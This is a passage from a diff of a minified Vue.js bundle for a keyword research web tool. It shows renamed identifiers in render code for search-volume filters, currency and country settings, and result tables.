+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -24701,7 +24723,7 @@ const iW = Ue({
                 se = k("search-results-actions");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), S("div", qJ, [S("div", EJ, [E(n, {
+            }, null, 8, ["loading"]), S("div", qK, [S("div", EK, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
@@ -24753,29 +24775,29 @@ const iW = Ue({
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [e.current_permissions.show_currency_settings ? (b(), g("div", UJ, [S("div", MJ, [S("h5", AJ, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", PJ, [S("div", LJ, [4 == e.current_tab ? (b(), g("div", BJ, [S("label", $J, v(e.trans.get("Country")), 1), S("input", {
+                }, [e.current_permissions.show_currency_settings ? (b(), g("div", UK, [S("div", MK, [S("h5", AK, v(e.trans.get("Search Volume Settings")), 1)])])) : T("", !0), 4 == e.current_tab ? (b(), g("div", PK, [S("div", $K, [4 == e.current_tab ? (b(), g("div", LK, [S("label", DK, v(e.trans.get("Country")), 1), S("input", {
                     disabled: "disabled",
                     class: "form-control",
                     type: "text",
                     value: e.selected_country_language_name
-                }, null, 8, DJ)])) : T("", !0)]), e.current_permissions.show_currency_settings ? (b(), g("div", OJ, [S("div", jJ, [S("label", VJ, v(e.trans.get("Currency")), 1), E(w, {
+                }, null, 8, jK)])) : T("", !0)]), e.current_permissions.show_currency_settings ? (b(), g("div", OK, [S("div", WK, [S("label", VK, v(e.trans.get("Currency")), 1), E(w, {
                     id: "metrics_currency_selection",
                     class: "search-results-settings-modal-currency-value",
                     "model-value": e.current_metrics_currency,
                     options: e.current_currency_list,
                     settings: {},
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", HJ, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", IJ, [E(f, {
+                }, null, 8, ["model-value", "options", "disabled"])])])) : T("", !0)])) : (b(), g("div", HK, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", IK, [E(f, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", NJ, [E(q, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", NK, [E(q, {
                     current_currency_list: e.current_currency_list,
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", RJ, [S("div", KJ, [S("h5", JJ, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", WJ, [S("div", zJ, [E(U, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)]))], 64)) : T("", !0), S("div", BK, [S("div", RK, [S("h5", KK, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", JK, [S("div", zK, [E(U, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -24791,7 +24813,7 @@ const iW = Ue({
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", YJ, [E(A, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", YK, [E(A, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -24804,7 +24826,7 @@ const iW = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -24813,7 +24835,7 @@ const iW = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", GJ, [S("div", XJ, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", GK, [S("div", XK, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -24822,7 +24844,7 @@ const iW = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", QJ, [S("div", ZJ, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", QK, [S("div", ZK, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -24836,14 +24858,14 @@ const iW = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, eW)])),
+                    }, null, 8, eJ)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, tW)])),
+                    }, null, 8, tJ)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -24868,7 +24890,7 @@ const iW = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", rW, [S("div", sW, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", rJ, [S("div", sJ, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -24876,18 +24898,18 @@ const iW = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"])) : T("", !0)])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", aW, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", aJ, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -24924,7 +24946,7 @@ const iW = Ue({
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [S("h4", oW, v(e.trans.get("Sorry, Etsy does not provide any keyword suggestions for your query")), 1)])),
+                message: C((() => [S("h4", oJ, v(e.trans.get("Sorry, Etsy does not provide any keyword suggestions for your query")), 1)])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Y, {
                 onMore: e.more,
@@ -24964,13 +24986,13 @@ const iW = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    nW = {
+    nJ = {
         class: "row g-0 me-lg-n1px"
     },
-    lW = {
+    lJ = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const cW = Ue({
+const cJ = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -24983,7 +25005,7 @@ const cW = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", nW, [S("div", lW, [E(i, {
+            return b(), g("div", nJ, [S("div", lJ, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -25008,17 +25030,17 @@ const cW = Ue({
             ])])])
         }]
     ]),
-    _W = {
+    _J = {
         class: "row g-0 me-lg-n1px"
     },
-    uW = {
+    uJ = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    dW = {
+    dJ = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const mW = Ue({
-        mixins: [DT],
+const mJ = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/etsy/languages",
@@ -25036,7 +25058,7 @@ const mW = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", _W, [S("div", uW, [E(i, {
+            return b(), g("div", _J, [S("div", uJ, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -25052,7 +25074,7 @@ const mW = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", dW, [E(i, {
+            ])]), S("div", dJ, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -25065,35 +25087,35 @@ const mW = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    hW = ["value"],
-    pW = ["value"],
-    gW = {
+    hJ = ["value"],
+    pJ = ["value"],
+    gJ = {
         key: 2,
         class: "row"
     },
-    yW = {
+    yJ = {
         class: "col-12"
     },
-    wW = {
+    wJ = {
         class: "check-search-volume-settings-country mb-3"
     },
-    fW = {
+    fJ = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    bW = {
+    bJ = {
         key: 3,
         class: "row"
     },
-    vW = {
+    vJ = {
         class: "col-12"
     },
-    kW = {
+    kJ = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    xW = {
+    xJ = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const CW = Ue({
+const CJ = Ue({
         mixins: [IT]
     }, [
         ["render", function(e, t, r, s, a, o) {
@@ -25103,12 +25125,12 @@ const CW = Ue({
                 name: "metrics_country",
                 type: "hidden",
                 value: e.country
-            }, null, 8, hW)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+            }, null, 8, hJ)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
                 key: 1,
                 name: "metrics_currency",
                 type: "hidden",
                 value: e.currency
-            }, null, 8, pW)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", gW, [S("div", yW, [S("div", wW, [S("label", fW, v(e.trans.get("Country")), 1), E(i, {
+            }, null, 8, pJ)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", gJ, [S("div", yJ, [S("div", wJ, [S("label", fJ, v(e.trans.get("Country")), 1), E(i, {
                 options: e.current_country_list,
                 settings: e.country_settings,
                 class: "check-search-volume-settings-country-value",
@@ -25116,7 +25138,7 @@ const CW = Ue({
                 "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
                 "model-value": e.current_metrics_country,
                 placeholder: e.trans.get("Type a country")
-            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", bW, [S("div", vW, [S("div", kW, [S("label", xW, v(e.trans.get("Currency")), 1), E(i, {
+            }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", bJ, [S("div", vJ, [S("div", kJ, [S("label", xJ, v(e.trans.get("Currency")), 1), E(i, {
                 options: e.current_currency_list,
                 settings: e.currency_settings,
                 class: "check-search-volume-settings-currency-value",
@@ -25127,11 +25149,11 @@ const CW = Ue({
             }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0)])
         }]
     ]),
-    SW = {
-        mixins: [mp, $T],
+    SJ = {
+        mixins: [mp, DT],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx,
+            "google-search-volume-result": Kx,
             "bing-search-volume-summary": lE,
             "bing-search-volume-result": yA
         },
@@ -25500,11 +25522,11 @@ const CW = Ue({
             }
         }
     },
-    TW = {
+    TJ = {
         key: 0,
         class: "dropdown-search-engines dropdown d-lg-none d-xl-none my-2"
     },
-    FW = {
+    FJ = {
         class: "dropdown-toggle-google btn dropdown-toggle text-dark px-2",
         href: "#",
         role: "button",
@@ -25513,83 +25535,83 @@ const CW = Ue({
         "aria-haspopup": "true",
         "aria-expanded": "false"
     },
-    qW = ["innerHTML"],
-    EW = {
+    qJ = ["innerHTML"],
+    EJ = {
         class: "ms-2"
     },
-    UW = {
+    UJ = {
         class: "dropdown-menu shadow",
         "aria-labelledby": "nav-search-engines-dropdown"
     },
-    MW = ["onClick"],
-    AW = ["innerHTML"],
-    PW = {
+    MJ = ["onClick"],
+    AJ = ["innerHTML"],
+    PJ = {
         class: "ms-1"
     },
-    LW = {
+    $J = {
         key: 0,
         class: "ms-1"
     },
-    BW = {
+    LJ = {
         class: "d-none d-lg-block"
     },
-    $W = {
+    DJ = {
         key: 0,
         class: "search-results-tabs-by-search-engines nav-search-tabs nav nav-tabs mb-3"
     },
-    DW = ["onClick", "data-bs-content", "id"],
-    OW = ["innerHTML"],
-    jW = {
+    jJ = ["onClick", "data-bs-content", "id"],
+    OJ = ["innerHTML"],
+    WJ = {
         key: 0,
         class: "ms-1"
     },
-    VW = {
+    VJ = {
         key: 1,
         class: "ms-1"
     },
-    HW = {
+    HJ = {
         class: "search-results-settings my-2"
     },
-    IW = {
+    IJ = {
         class: "search-results-settings-display mx-n1"
     },
-    NW = {
+    NJ = {
         key: 0,
         type: "button",
         class: "btn-search-results-settings-display-currency btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
     },
-    RW = {
+    BJ = {
         class: "search-results-settings-display-currency-label"
     },
-    KW = {
+    RJ = {
         class: "search-results-settings-display-currency-value"
     },
-    JW = {
+    KJ = {
         key: 1,
         type: "button",
         class: "btn-search-results-settings-display-location btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
     },
-    WW = {
+    JJ = {
         class: "search-results-settings-display-location-label"
     },
-    zW = {
+    zJ = {
         class: "search-results-settings-display-location-value"
     },
-    YW = {
+    YJ = {
         key: 2,
         type: "button",
         class: "btn-search-results-settings-display-language btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
     },
-    GW = {
+    GJ = {
         class: "search-results-settings-display-language-label"
     },
-    XW = {
+    XJ = {
         class: "search-results-settings-display-language-value"
     },
-    QW = {
+    QJ = {
         class: "row"
     },
-    ZW = {
+    ZJ = {
         class: "col"
     },
     ez = {
@@ -25707,20 +25729,20 @@ const CW = Ue({
     Pz = {
         class: "row my-2 my-lg-3 py-0 py-lg-3 alert alert-warning"
     },
-    Lz = {
+    $z = {
         class: "col"
     },
-    Bz = {
+    Lz = {
         class: "mt-2 mb-4 my-lg-4"
     },
-    $z = ["innerHTML"],
-    Dz = {
+    Dz = ["innerHTML"],
+    jz = {
         key: 1
     },
     Oz = {
         class: "col-sm-12 col-lg-4"
     },
-    jz = {
+    Wz = {
         class: "row"
     },
     Vz = S("div", {
@@ -25733,10 +25755,10 @@ const CW = Ue({
     Nz = S("div", {
         class: "col-3 d-lg-none d-xl-none"
     }, null, -1),
-    Rz = S("i", {
+    Bz = S("i", {
         class: "bi bi-trash me-1"
     }, null, -1);
-const Kz = Ue(SW, [
+const Rz = Ue(SJ, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("loading-section"),
                 n = k("current-filter-keyword-result-period"),
@@ -25751,18 +25773,18 @@ const Kz = Ue(SW, [
                 q = k("current-split-filter-keywords"),
                 M = k("current-split-filter-negative-keywords"),
                 A = k("tom-select"),
-                $ = k("search-results-settings-modal-search-volume"),
-                D = k("search-results-settings-modal-search-volume-trend"),
+                D = k("search-results-settings-modal-search-volume"),
+                j = k("search-results-settings-modal-search-volume-trend"),
                 O = k("search-results-settings-modal-average-cpc"),
-                j = k("search-results-settings-modal-bing-competition"),
+                W = k("search-results-settings-modal-bing-competition"),
                 V = k("search-results-settings-modal-competition"),
                 H = k("search-results-settings-filter-positive-keywords"),
                 I = k("search-results-settings-filter-negative-keywords"),
                 N = k("search-results-settings-modal"),
-                R = k("suggest-page-reload"),
-                K = k("bing-search-volume-summary"),
-                J = k("google-search-volume-summary"),
-                W = k("bing-search-volume-result"),
+                B = k("suggest-page-reload"),
+                R = k("bing-search-volume-summary"),
+                K = k("google-search-volume-summary"),
+                J = k("bing-search-volume-result"),
                 z = k("google-search-volume-result"),
                 Y = k("search-results-table-wrapper"),
                 G = k("has-more"),
@@ -25773,12 +25795,12 @@ const Kz = Ue(SW, [
                 te = k("dropdown-menu-item-copy-keywords-search-volume"),
                 re = k("dropdown-menu-item-copy-keywords-all-data"),
                 se = k("search-results-actions"),
-                ae = L("mask");
+                ae = $("mask");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), a.current_sub_tabs ? (b(), g("div", TW, [S("a", FW, [S("span", {
+            }, null, 8, ["loading"]), a.current_sub_tabs ? (b(), g("div", TJ, [S("a", FJ, [S("span", {
                 innerHTML: a.current_sub_tab_item.icon
-            }, null, 8, qW), S("span", EW, v(a.current_sub_tab_item.title), 1)]), S("div", UW, [(b(!0), g(y, null, w(a.current_sub_tabs, ((t, r) => (b(), g("a", {
+            }, null, 8, qJ), S("span", EJ, v(a.current_sub_tab_item.title), 1)]), S("div", UJ, [(b(!0), g(y, null, w(a.current_sub_tabs, ((t, r) => (b(), g("a", {
                 key: r,
                 href: null,
                 onClick: e => o.applySubTab(t.value),
@@ -25788,9 +25810,9 @@ const Kz = Ue(SW, [
                 }])
             }, [S("span", {
                 innerHTML: t.icon
-            }, null, 8, AW), S("span", PW, v(t.title), 1), t.total > 0 ? (b(), g("span", LW, [P("("), S("span", {
+            }, null, 8, AJ), S("span", PJ, v(t.title), 1), t.total > 0 ? (b(), g("span", $J, [P("("), S("span", {
                 class: f("total-keyword-basket-items-" + t.value)
-            }, v(e.$filters.digit(t.total)), 3), P(")")])) : T("", !0)], 10, MW)))), 128))])])) : T("", !0), S("div", BW, [a.current_sub_tabs ? (b(), g("ul", $W, [(b(!0), g(y, null, w(a.current_sub_tabs, ((t, r) => (b(), g("li", {
+            }, v(e.$filters.digit(t.total)), 3), P(")")])) : T("", !0)], 10, MJ)))), 128))])])) : T("", !0), S("div", LJ, [a.current_sub_tabs ? (b(), g("ul", DJ, [(b(!0), g(y, null, w(a.current_sub_tabs, ((t, r) => (b(), g("li", {
                 class: "nav-item",
                 key: r
             }, [S("a", {
@@ -25807,24 +25829,24 @@ const Kz = Ue(SW, [
                 id: `subnav${t.value}`
             }, [S("span", {
                 innerHTML: t.icon
-            }, null, 8, OW), t.value == a.current_sub_tab ? (b(), g("span", jW, v(t.title), 1)) : T("", !0), t.total > 0 ? (b(), g("span", VW, [P("("), S("span", {
+            }, null, 8, OJ), t.value == a.current_sub_tab ? (b(), g("span", WJ, v(t.title), 1)) : T("", !0), t.total > 0 ? (b(), g("span", VJ, [P("("), S("span", {
                 class: f("total-keyword-basket-items-" + t.value)
-            }, v(e.$filters.digit(t.total)), 3), P(")")])) : T("", !0)], 10, DW)])))), 128))])) : T("", !0)]), S("div", HW, [S("div", IW, [E(n, {
+            }, v(e.$filters.digit(t.total)), 3), P(")")])) : T("", !0)], 10, jJ)])))), 128))])) : T("", !0)]), S("div", HJ, [S("div", IJ, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
                 default_keyword_result_period: e.default_keyword_result_period
             }, null, 8, ["onClearFilter", "current_permissions", "show_current_filter_keyword_result_period", "default_keyword_result_period"]), e.current_permissions.show_search_volume_data ? (b(), g(y, {
                 key: 0
-            }, [e.show_current_filter_currency ? (b(), g("button", NW, [S("strong", RW, v(e.trans.get("Currency")) + ":", 1), S("span", KW, v(e.show_current_filter_currency), 1), S("a", {
+            }, [e.show_current_filter_currency ? (b(), g("button", NJ, [S("strong", BJ, v(e.trans.get("Currency")) + ":", 1), S("span", RJ, v(e.show_current_filter_currency), 1), S("a", {
                 class: "search-results-settings-display-currency-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[0] || (t[0] = t => e.clearFilter("currency"))
-            }, "×")])) : T("", !0), e.show_current_filter_location ? (b(), g("button", JW, [S("strong", WW, v(e.trans.get("Location")) + ":", 1), S("span", zW, v(e.show_current_filter_location), 1), S("a", {
+            }, "×")])) : T("", !0), e.show_current_filter_location ? (b(), g("button", KJ, [S("strong", JJ, v(e.trans.get("Location")) + ":", 1), S("span", zJ, v(e.show_current_filter_location), 1), S("a", {
                 class: "search-results-settings-display-location-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[1] || (t[1] = t => e.clearFilter("location"))
-            }, "×")])) : T("", !0), e.show_current_filter_language ? (b(), g("button", YW, [S("strong", GW, v(e.trans.get("Language")) + ":", 1), S("span", XW, v(e.show_current_filter_language), 1), S("a", {
+            }, "×")])) : T("", !0), e.show_current_filter_language ? (b(), g("button", YJ, [S("strong", GJ, v(e.trans.get("Language")) + ":", 1), S("span", XJ, v(e.show_current_filter_language), 1), S("a", {
                 class: "search-results-settings-display-language-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[2] || (t[2] = t => e.clearFilter("language"))
@@ -25885,7 +25907,7 @@ const Kz = Ue(SW, [
                 onClonedDataOnShownModal: e.clonedDataOnShownModal,
                 onRestoreClonedDataOnHideModal: e.restoreClonedDataOnHideModal
             }, {
-                content: C((() => [S("div", QW, [S("div", ZW, [S("h5", ez, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data || e.current_permissions.show_location_data || e.current_permissions.show_language_data ? (b(), g(y, {
+                content: C((() => [S("div", QJ, [S("div", ZJ, [S("h5", ez, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data || e.current_permissions.show_location_data || e.current_permissions.show_language_data ? (b(), g(y, {
                     key: 0
                 }, [e.current_permissions.show_location_data || e.current_permissions.show_language_data ? (b(), g("div", tz, [e.current_permissions.show_location_data ? (b(), g("div", rz, [S("div", sz, [S("label", az, v(e.trans.get("Location")), 1), E(A, {
                     disabled: e.loading,
@@ -25904,7 +25926,7 @@ const Kz = Ue(SW, [
                     options: e.current_language_list,
                     settings: a.language_settings,
                     disabled: 4 == e.current_tab
-                }, null, 8, ["model-value", "options", "settings", "disabled"])])])) : T("", !0)])) : T("", !0), S("div", lz, [e.current_permissions.show_search_volume_data ? (b(), g("div", cz, [E($, {
+                }, null, 8, ["model-value", "options", "settings", "disabled"])])])) : T("", !0)])) : T("", !0), S("div", lz, [e.current_permissions.show_search_volume_data ? (b(), g("div", cz, [E(D, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -25912,7 +25934,7 @@ const Kz = Ue(SW, [
                     "onUpdate:current_filter_search_volume_min": t[5] || (t[5] = t => e.current_filter_search_volume_min = t),
                     current_filter_search_volume_max: e.current_filter_search_volume_max,
                     "onUpdate:current_filter_search_volume_max": t[6] || (t[6] = t => e.current_filter_search_volume_max = t)
-                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"])])) : T("", !0), e.current_permissions.show_search_volume_data ? (b(), g("div", _z, [E(D, {
+                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"])])) : T("", !0), e.current_permissions.show_search_volume_data ? (b(), g("div", _z, [E(j, {
                     current_permissions: e.current_permissions,
                     search_volume_trend_format: e.search_volume_trend_format,
                     error_fields: e.error_fields,
@@ -25928,7 +25950,7 @@ const Kz = Ue(SW, [
                     "onUpdate:current_filter_average_cpc_min": t[9] || (t[9] = t => e.current_filter_average_cpc_min = t),
                     current_filter_average_cpc_max: e.current_filter_average_cpc_max,
                     "onUpdate:current_filter_average_cpc_max": t[10] || (t[10] = t => e.current_filter_average_cpc_max = t)
-                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"])])) : T("", !0), e.current_permissions.show_competition_data ? (b(), g("div", dz, [e.summaries.has_competition_text ? (b(), x(j, {
+                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"])])) : T("", !0), e.current_permissions.show_competition_data ? (b(), g("div", dz, [e.summaries.has_competition_text ? (b(), x(W, {
                     key: 0,
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
@@ -26003,9 +26025,9 @@ const Kz = Ue(SW, [
                     "onUpdate:current_negative_keywords": t[20] || (t[20] = t => e.current_negative_keywords = t)
                 }, null, 8, ["onCheckDuplicate", "current_remain_negative_keywords", "error_fields", "current_negative_keywords"])])])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(R, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(B, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", qz, [S("div", Ez, [3 == a.current_sub_tab ? (b(), x(K, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", qz, [S("div", Ez, [3 == a.current_sub_tab ? (b(), x(R, {
                 key: 0,
                 loading: e.loading,
                 current_tab: e.current_tab,
@@ -26017,7 +26039,7 @@ const Kz = Ue(SW, [
                 current_filter_location: e.current_filter_location,
                 current_filter_language: e.current_filter_language,
                 show_settings_button: !0
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_filter_currency", "current_filter_location", "current_filter_language"])) : (b(), x(J, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_filter_currency", "current_filter_location", "current_filter_language"])) : (b(), x(K, {
                 key: 1,
                 loading: e.loading,
                 current_tab: e.current_tab,
@@ -26030,14 +26052,14 @@ const Kz = Ue(SW, [
                 current_filter_language: e.current_filter_language,
                 show_settings_button: !0
             }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_filter_currency", "current_filter_location", "current_filter_language"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
             ]), S("div", Uz, [E(Y, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics,
                 current_filter_is_on: e.current_filter_is_on
             }, {
-                wrapper: C((() => [3 == a.current_sub_tab ? (b(), x(W, {
+                wrapper: C((() => [3 == a.current_sub_tab ? (b(), x(J, {
                     key: 0,
                     loading: e.loading,
